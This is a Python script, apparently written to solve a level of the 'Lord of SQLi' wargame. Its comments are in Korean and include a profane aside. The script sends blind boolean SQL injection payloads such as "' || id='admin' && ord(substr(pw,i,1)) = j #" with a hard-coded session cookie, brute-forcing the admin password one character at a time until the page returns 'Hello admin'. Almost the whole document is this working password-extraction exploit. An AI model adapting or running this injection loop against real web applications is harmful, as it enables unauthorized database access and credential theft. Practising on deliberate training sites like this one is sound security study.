#-*- coding: utf-8 -*-
import http
import http.client
import http.server
import http.cookies
import urllib
import urllib.request
import urllib.response
import urllib.parse
import urllib.error
#헥스로 바꿀수 있겠다야
#char 는 아스키코드값, 0xhex값
#ord 는 문자를 주면  무조건 맨 왼쪽의 코드값으로 준다. 여기서 문자는 0xhex로 전달가능
# ex) 는 시발 개뿔
pw=[]
for i in range(1,11):
	for j in range(150,260):
		#url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27%20||%20id=%27admin%27%20%26%26%20substr(pw,{0},1)%20%20%3C%20char({1})%20%23".format(i,j)
		#url='http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=asdf&no=1 or id LIKE "admin" %26%26 left(pw,{0}) LIKE "{password}{ascii}"'.format(i,password=pw,ascii=arr[j])
		url = "http://los.rubiya.kr/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=%27%20||%20id=%27admin%27%20%26%26%20ord(substr(pw,{0},1))%20=%20{1}%20%23".format(i,j)
		r = urllib.request.Request(url)
		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
		print(url)
		data = urllib.request.urlopen(r).read().decode("utf-8")
		if data.find("Hello admin") != -1 :
			pw.append(j)
			print("Password : {0}".format(j))
			break
print(pw)
'''
#160,180,180,161,180,180,180,161,161,161 //d이거아님
'''
#184,249,197,167,198,208,196,161,164,187
#print()
#s=chr(184)+""+chr(249)+""+chr(197)+""+chr(167)+""+chr(198)+""+chr(208)+""+chr(196)+""+chr(161)+""+chr(164)+""+chr(187)
#print()